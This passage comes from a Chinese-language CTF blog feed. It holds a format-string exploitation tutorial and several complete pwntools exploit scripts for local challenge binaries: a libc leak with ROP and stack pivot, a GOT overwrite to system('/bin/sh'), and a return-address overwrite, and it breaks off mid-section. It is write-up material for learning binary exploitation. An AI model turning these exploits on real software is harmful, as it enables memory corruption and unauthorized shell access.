class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#把格式化输出的地址转化为int类型的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcan</span>(<span class="params">bcannary</span>):</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bcannary)):</span><br><span class="line"><span class="keyword">if</span>(bcannary[i] == <span class="number">10</span>):</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">new_c = [<span class="number">0</span>] * i</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">new_c[i - j - <span class="number">1</span>] = bcannary[j]</span><br><span class="line"></span><br><span class="line">j -= <span class="number">2</span></span><br><span class="line">can = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(j+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span> (new_c[i] &gt; <span class="number">47</span>) &amp; (new_c[i] &lt; <span class="number">60</span>):</span><br><span class="line">can += <span class="built_in">pow</span>(<span class="number">16</span>,i) * (new_c[i] - <span class="number">48</span>)</span><br><span class="line"><span class="keyword">elif</span> (new_c[i] &gt; <span class="number">96</span>) &amp; (new_c[i] &lt; <span class="number">103</span>):</span><br><span class="line">can += <span class="built_in">pow</span>(<span class="number">16</span>,i) * (new_c[i] - <span class="number">87</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> can</span><br><span class="line"></span><br><span class="line"><span class="comment">#开始</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">puts = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_g = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#先走4拿puts地址</span></span><br><span class="line">payload = <span class="string">b&#x27;4&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;\n1.acm\n2.ctf\n3.love\n4.heart\n&gt; \n&quot;</span>,payload)</span><br><span class="line">r = p.recv()[<span class="number">83</span>:<span class="number">100</span>]</span><br><span class="line">puts_addr = calcan(r)</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算出system函数和binsh地址，以及ROPgadget找出的pop rdi；retn的地址</span></span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi_ret = <span class="number">0x401573</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#按地址顺序写入需要payload提权的内容</span></span><br><span class="line">payload = <span class="string">b&#x27;2&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(p64(pop_rdi_ret))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;1&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(p64(binsh_addr))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;3&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(p64(system_addr))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#进入heart函数</span></span><br><span class="line">payload = <span class="string">b&#x27;4&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#aim即为 ao 地址，leave为ida找出heart自身的leave指令地址</span></span><br><span class="line">aim = <span class="number">0x4050A0</span></span><br><span class="line">leave = <span class="number">0x40139E</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span> + p64(aim-<span class="number">8</span>) + p64(leave)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;now, come and read my heart...\n&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Reverse&quot;&gt;&lt;a href=&quot;#Reverse&quot; class=&quot;headerlink&quot; title=&quot;Reverse&quot;&gt;&lt;/a&gt;Reverse&lt;/h2&gt;&lt;h3 id=&quot;try-decrypt-me&quot;&gt;&lt;a href=&quot;#try-decrypt-me&quot; cla</summary>
      
    
    
    
    <category term="WriteUp" scheme="https://secondbc.github.io/SecondBC/categories/WriteUp/"/>
    
    
    <category term="Bin" scheme="https://secondbc.github.io/SecondBC/tags/Bin/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串</title>
    <link href="https://secondbc.github.io/SecondBC/2023/04/13/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <id>https://secondbc.github.io/SecondBC/2023/04/13/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</id>
    <published>2023-04-13T15:18:16.000Z</published>
    <updated>2023-04-13T15:35:06.148Z</updated>
    
    <content type="html"><![CDATA[<p>具体见：<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_2">利用 - CTF Wiki (ctf-wiki.org)</a></p><h2 id="写法"><a href="#写法" class="headerlink" title="写法"></a>写法</h2><p>在使用printf函数时，会用到如下内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%d<span class="comment">//打印整数</span></span><br><span class="line">%x<span class="comment">//打印十六进制</span></span><br><span class="line">%p<span class="comment">//打印指针数值（32位打印4字节，64位打印8字节）</span></span><br><span class="line">%s<span class="comment">//打印字符串（打印地址指向的内容）</span></span><br><span class="line">%n<span class="comment">//将该格式化之前的字符数量通过地址存入变量中；</span></span><br></pre></td></tr></table></figure><p>这里重点说明下 %s，%n；</p><p>%s 虽说时用来打印字符串的，但其本质是将参数视作指针，打印指针指向的内容，一直显示到 ‘\x00’ ，当使用 recv() 函数接收时，得到的是 byte 类型，所以可以得到 int 类型；</p><p>%n 如下图所示：</p><p><img src="https://s2.loli.net/2023/04/13/pYgjawuVRLskP4A.png" alt="%n"></p><p>它将存储出现在 %n 之前的字符数量到对应的参数变量中，本身不会有任何显示；</p><p>如上图实际打印的内容是： “geeks for geeks” ；</p><p>且 %n 一般跑在gcc编译的c中，Windows上的编译器会有问题；</p><p>同样只能跑在 gcc 中的另类写法，也是格式化字符串利用的核心：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">3</span>$x</span><br></pre></td></tr></table></figure><p>用下面代码举例，上面的写法会打印出printf的第4个参数的hex形式，也就是c；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%3$x&quot;</span>,a,b,c,d);</span><br></pre></td></tr></table></figure><p>3的意思是从格式化字符串开始往后算的第三个参数，x表示格式；</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在32位程序中，调用函数时，变量都是存在栈上的，比如当调用下示代码时，会有如此的栈格式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%3$x&quot;</span>,a,b,c,d);</span><br></pre></td></tr></table></figure><p>栈：</p><table><thead><tr><th>ebp-&gt;</th><th>0xold_ebp          //printf函数内部栈帧</th></tr></thead><tbody><tr><td>0地址</td><td>0xretaddr          //返回地址</td></tr><tr><td>1地址</td><td>0xstringaddr       //格式化字符串 “%3$x” 地址</td></tr><tr><td>2地址</td><td>a</td></tr><tr><td>3地址</td><td>b</td></tr><tr><td>4地址</td><td>c</td></tr><tr><td>5地址</td><td>d</td></tr></tbody></table><p>当然真实情况中，这些参数的顺序会有变化（一般就是这样），但是可以通过调试确定下来；</p><p>格式化字符串符号 <code>%</code> 的作用就是：读取栈中这些变量的内容，对应的将其打印出来；</p><p>第一个%打印第一个参数，第二个%打印第二个参数，也就是栈中的a，b；</p><p>当然用特殊的写法可打印对应的参数的内容；</p><h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><p>利用 <code>%k$p</code> 获取数据内容，利用 <code>%k$s</code> 获取指针指向的内容，利用 <code>[AimAddr]%k$s</code> 获取指定地址处的内容；</p><h3 id="泄露栈变量内存"><a href="#泄露栈变量内存" class="headerlink" title="泄露栈变量内存"></a>泄露栈变量内存</h3><p>考虑如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%2$x&quot;</span>);</span><br></pre></td></tr></table></figure><p>它没有跟参数能这样写吗？</p><p>答案是可以，拿上面用表格画的栈图来说，此时它的作用就是将3地址的内容以十六进制打印出来，尽管此时3地址里放的是奇怪的东西；</p><p>于是就可以先算出想要得到的 在main栈帧 里的数据对于地址1的间隔 k；</p><p>比如现在main中想得到其上级函数的ebp值，调试可知ebp的值存于 m地址 中，那么 k 就应该是：<br>$$<br>k = （m地址 - 1地址） / 指针长度<br>$$<br>指针长度即为对齐，32位是4，64位是8；</p><p>此时执行    <code>printf(&quot;%k$p&quot;);</code>    便可得到main中储存的上级函数ebp的值；</p><p>这个k的数值，也同样是printf函数的第 k+1 个参数，因为1地址中存的是格式化字符串，也就是printf函数的第 1 个参数；</p><h3 id="泄露以变量为指针指向的内存"><a href="#泄露以变量为指针指向的内存" class="headerlink" title="泄露以变量为指针指向的内存"></a>泄露以变量为指针指向的内存</h3><p>还记得 %s 的作用吗，它会打印出以变量为指针所指的内容；</p><p>got表就是一个指针，对于在got表地址上的函数，其实都是指向其真实存在的地址的指针；</p><p>假设scanf在got中的地址就是0x12345678，那么利用如下代码，便可打印出 scanf 函数的真实地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x12345678%x%k$s&quot;</span>);</span><br></pre></td></tr></table></figure><p>当此格式化字符串在输出函数调用时是第 k+1个参数的时候，这么写，就能让 %k$s 去格式化 0x12345678 字符串，从而就能得到 0x12345678 指向的内容，进而打印出来得到 scanf 真正的地址；</p><p>但很多时候，第k + 1个参数是 “3456..” 或者干脆 “烫烫烫0x1234..” 诸如此类的；</p><p>意思是，它并没有对齐，所以当调试结果为上述情况时，请在0x12345678地址前添加垃圾信息，使得在 整数倍的 k + 1 上能够直接拿到 0x12345678 地址，进而使得后面的特殊写法打印出该地址指向的内容；</p><p>获取栈中指定指针内存就没那么麻烦了，正如泄露变量内存一样的写法，只是将p改为s；</p><h2 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h2><p>这个时候，%n会帮大忙，它可以将其对应参数视为指针，以int型填入在%n前面的字符数量；</p><p>所以当知道要覆盖内存的<strong>地址</strong>，格式化字符串相对于输出函数的<strong>偏移</strong>就可以进行覆盖了；</p><p>具体格式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;...[AimAddr]...%k$n&quot;</span>);</span><br></pre></td></tr></table></figure><p>如上的…为垃圾内容负责填充 AimAddr 的对齐，k要找到 AimAddr的位置，后面的…是为了与前面的字符一起扩展成想要的长度，使其填入 AimAddr 中；</p><h3 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h3><p>此时要把 AimAddr 放在 %n 的后面，这样能控制填入的数据始终可以小于4；</p><p>具体格式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;...%k$n...[AimAddr]&quot;</span>);</span><br></pre></td></tr></table></figure><p>此时…的作用就反转了，前面的是控制写入的数，后者为控制地址的对齐；</p><h3 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h3><p>可以用 … 来扩展很长很长，但会使得程序的性能变低，出来的速度下降；</p><p>以 %hhn 来写，可以使得填入变量的类型为字节，以 %hn 来写，可以使得填入变量的类型为双字；</p><p>由此可以控制单个字节的覆盖；</p><p>而一个int型是需要占4个字节的，那么分别填入单字节内容，使其最后呈现出大数字的效果就行；</p><p>比如：c变量的地址为：[c]，而想对其填入0x12345678则其内存中应该是如此分布的：</p><table><thead><tr><th>地址</th><th>存储</th></tr></thead><tbody><tr><td>[c]</td><td>0x78</td></tr><tr><td>[c+1]</td><td>0x56</td></tr><tr><td>[c+2]</td><td>0x34</td></tr><tr><td>[c+3]</td><td>0x12</td></tr></tbody></table><p>x86为小端序存储；</p><p>那么对应printf中的内容应该是这样的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;...[c][c+1][c+2][c+3]...%k$hhn...%k+1$hhn...%k+2$hhn...%k+3$hhn&quot;</span>);</span><br></pre></td></tr></table></figure><p>使得k能找到[c]的位置，且控制 %k$hhn 前面的数量为 0x78 ，而第二个%hhn的控制数量应该是 0x156，因为只能增大，不能减小，但是填入的是一个字节的内容，所以只会填入 0x56，后面同理；</p><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><p>用题来举例；</p><h3 id="goodluck"><a href="#goodluck" class="headerlink" title="goodluck"></a>goodluck</h3><p>看IDA的main函数：</p><p><img src="https://s2.loli.net/2023/04/12/cbldO6YQeJKvHPm.png" alt="main"></p><p>可以看的出来整个程序逻辑为，输入后和远程服务器的flag文件比较，仅此而已；</p><p>但是它会用printf泄露出输入的内容，所以可以想到用格式化字符串的方法泄露v10的信息；</p><p>因为程序是x64，所以函数存放参数的话，是先放在前6个寄存器中，多余的参数放在栈上，所以寻找到合适的栈偏移后，需要加上6；</p><p><img src="https://s2.loli.net/2023/04/12/7FrviJtwasYpzeo.png" alt="gdb"></p><p>如上图，这是在printf函数内部，此时的栈图rsp刚刚指向返回地址，那么下面的就都可以看成是 “参数” 了；</p><p>可以看到构造的flag文件的内容被放到了rsp往下第四个，加上前6个参数，这算作printf函数的第10个参数，所以在邪路时，写为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;%9$s&quot;</span></span><br></pre></td></tr></table></figure><p>用指针方式读出该flag；</p><p>解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./goodluck&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%9$s&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;what&#x27;s the flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure><h3 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h3><p>未开启 RELRO 保护（Partial RELRO）的程序是可以修改 GOT 表的；</p><p>那么可以覆盖System地址给目标函数的地址到got表，此时执行目标函数也就是执行System函数了；</p><p>一般步骤：</p><ol><li><p>获取目标函数的got表地址：IDA查询；</p></li><li><p>获取System函数的内存地址：通过泄露计算；</p></li><li><p>写入：运用ROP或者write函数或者%n覆盖；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//此时目标函数为printf</span><br><span class="line">pop eax; ret;           # printf@got -&gt; eax</span><br><span class="line">pop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebx</span><br><span class="line">add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</span><br></pre></td></tr></table></figure></li></ol><p>看题：</p><p>查看IDA代码：</p><p><img src="https://s2.loli.net/2023/04/12/FEYWX9sbKqay3HM.png" alt="main"></p><p>主函数一开始有个比较密码，这个逆向还原就行；</p><p>接下来是模拟shell，可以输入三种命令：put get dir，分别创建 file_head ，打印content，打印 file_head；</p><p>这个题里不存在栈溢出，所以没办法ret，但却是 partial relro，且有格式化字符串漏洞；</p><p>所以可以把puts的got表作为指针修改为System地址去执行，因为两个参数类型数量也一样，满足调用约定；</p><p>则binsh字符串写入file_head中，格式化字符串漏洞的内容写入content；</p><p>此时可以通过格式化字符串漏洞泄露出printf got表地址，从而得到system函数地址；</p><p>具体思路：</p><ol><li>通过密码；</li><li>执行put，写入任意和字符串漏洞内容；</li><li>执行get，泄露system地址；</li><li>执行put，写入字符串漏洞%n覆盖got表指向地址；</li><li>执行get，完成got表覆盖；</li><li>再次执行put，写入binsh字符串；</li><li>执行dir，完成攻击；</li></ol><p>首先通过调试把字符串漏洞的偏移确定下来为8；也就是 <code>%7$s</code>；</p><p>通过代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">printfgot = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">putsgot = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入密码</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Name (ftp.hacker.server:Rainism):&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;rxraclhm&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行put泄露地址</span></span><br><span class="line">p.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x00haha&#x27;</span>)</span><br><span class="line">p.sendline(p32(printfgot) + <span class="string">b&#x27;%7$s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行get</span></span><br><span class="line">p.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x00haha&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露printf地址并计算system地址</span></span><br><span class="line">printf_addr = u32(p.recv()[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">libc.address = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行put覆盖地址</span></span><br><span class="line">p.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x001122&#x27;</span>)</span><br><span class="line"><span class="comment">#pwntools自行构建覆盖payload，7是字符串相对于第一个参数偏移</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;putsgot:system&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#再次执行get</span></span><br><span class="line">p.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x001122&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#最后一次执行put</span></span><br><span class="line">p.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;deadbeaf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行dir实现攻击</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;dir&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>至于为什么前两次发送 file_head 的时候要加\X00，是因为最后执行system(s)的时候，s会有bug，不加00的话，最后的结果是三串字符串连接在一起，导致system找不到路径；</p><h3 id="hijack-retaddr"><a href="#hijack-retaddr" class="headerlink" title="hijack retaddr"></a>hijack retaddr</h3><p>最重要的思想：通过rbp取栈地址；</p><p>查看IDA：</p><p><img src="https://s2.loli.net/2023/04/13/3caMnmDPT1EVS2v.png" alt="main"></p><p>上面是main函数，一开始会让输入账户和密码，也就是register函数，同时是两个可以利用的缓冲区；</p><p>进入choice函数后，和上道题一样，有三个选择，其中edit是重新写入账户密码，show是两次字符串漏洞，quit是执行一个puts函数；</p><p>但这道题开启了RELRO保护，所以不能和上道题一样改变puts的got表，所以思想是覆盖返回地址；</p><p>返回地址在栈上，既然要覆盖它，就必须拿到栈上的地址，那么rbp存储的内容就很值得推敲了；</p><p>在show中拥有两次字符串漏洞，分别展示之前输入的账户和密码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_400B07</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5, <span class="keyword">int</span> a6, <span class="keyword">char</span> format, <span class="keyword">int</span> a8, __int64 a9)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  write(<span class="number">0</span>, <span class="string">&quot;Welc0me to sangebaimao!\n&quot;</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;a9 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在此程序的地址：0x4008AA处，会发现一个system(“/bin/sh”)的调用，那么可以利用字符串漏洞覆盖返回地址为该地址；</p><p>输入se和ss并在return的printf处打下断点并查看栈图：</p><p><img src="https://s2.loli.net/2023/04/13/q5evKfMHBwygnWp.png" alt="stack"></p><p>可以看到printf的第三个参数是输入的账号，第一排为printf的返回地址，而第二个参数是show函数的返回地址，如下方汇编所示；</p><p>第一个参数是show函数的rbp指向，则旧rbp值也是指向栈的，所以可以利用旧rbp值来进行便宜计算，拿到返回地址的地址；<br>$$<br>c0 - 80 - 8 = 38<br>$$<br>则用旧rbp值减去0x38便可以得到返回choice函数地址的地址；</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#把格式化输出的地址转化为int类型的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b2i</span>(<span class="params">b,<span class="built_in">len</span></span>):</span></span><br><span class="line">i = <span class="built_in">len</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">new_c = [<span class="number">0</span>] * i</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">new_c[i - j - <span class="number">1</span>] = b[j]</span><br><span class="line"></span><br><span class="line">j -= <span class="number">2</span></span><br><span class="line">res = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(j+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">if</span> (new_c[i] &gt; <span class="number">47</span>) &amp; (new_c[i] &lt; <span class="number">60</span>):</span><br><span class="line">res += <span class="built_in">pow</span>(<span class="number">16</span>,i) * (new_c[i] - <span class="number">48</span>)</span><br><span class="line"><span class="keyword">elif</span> (new_c[i] &gt; <span class="number">96</span>) &amp; (new_c[i] &lt; <span class="number">103</span>):</span><br><span class="line">res += <span class="built_in">pow</span>(<span class="number">16</span>,i) * (new_c[i] - <span class="number">87</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwnme_k0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一次账号密码</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;Aanyway&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;%6$p&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#show1用于泄露返回地址的地址</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">retaddr = p.recv()[<span class="number">8</span>:<span class="number">22</span>]</span><br><span class="line">retaddr = b2i(retaddr,<span class="number">22</span> - <span class="number">8</span>) - <span class="number">0x38</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(retaddr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit第二次账号密码</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(p64(retaddr)) </span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#2218对应十六进制08AA,用hn覆盖低两个字节，因为再往上的字节实际上都是40一样的</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;%2218d%8$hn&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#show2用于返回shell</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="字符串盲打"><a href="#字符串盲打" class="headerlink" title="字符串盲打"></a>字符串盲打</h2><p>字如其名，手里没有可逆向的文件，只能靠格式化字符串输入来获取远程文件的信息以攻占shell；</p><p>一般来说有如下步骤：</p><ul><li>确定程序位数</li><li>确定漏洞位置</li><li>利用</li></ul><h3 id="栈泄露"><a href="#栈泄露" class="headerlink" title="栈泄露"></a>栈泄露</h3><p>查看题目输入%p查看多少位：</p><p><img src="https://s2.loli.net/2023/04/13/qGOrZsHwXg834m1.png" alt="aim"></p><p>此图的上半部分展示了它是64位的程序；</p><p>且它有提示告知了：flag is on 